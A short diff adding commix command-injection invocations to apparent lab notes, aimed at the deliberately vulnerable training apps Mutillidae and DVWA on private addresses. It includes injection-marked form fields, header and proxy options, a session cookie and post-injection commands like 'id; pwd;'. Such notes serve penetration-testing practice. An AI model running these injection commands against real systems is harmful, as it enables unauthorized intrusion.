@@ -5,3 +5,15 @@ commix -u "http://localhost/mutillidae/index.php?page=dns-lookup.php" --data="ta
 id; pwd;
 echo "evidencecookie" > evidence.txt
 
+# COMMIX > Exploiting OWASP Mutillidae using extra headers and HTTP Proxy (NOT TESTED):
+./commix.py
+  --url="http://192.168.178.46/mutillidae/index.php?popUpNotificationCode=SL5&page=dns-lookup.php"
+  --data="target_host=INJECT_HERE"
+  --headers="Accept-Language:fr\nETag:123\n"
+  --proxy="127.0.0.1:8081"
+
+# COMMIX > Exploiting DVWA:
+./commix.py
+  --url="http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#" (NOT TESTED)
+  --data="ip=INJECT_HERE&submit=submit"
+  --cookie="security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4"
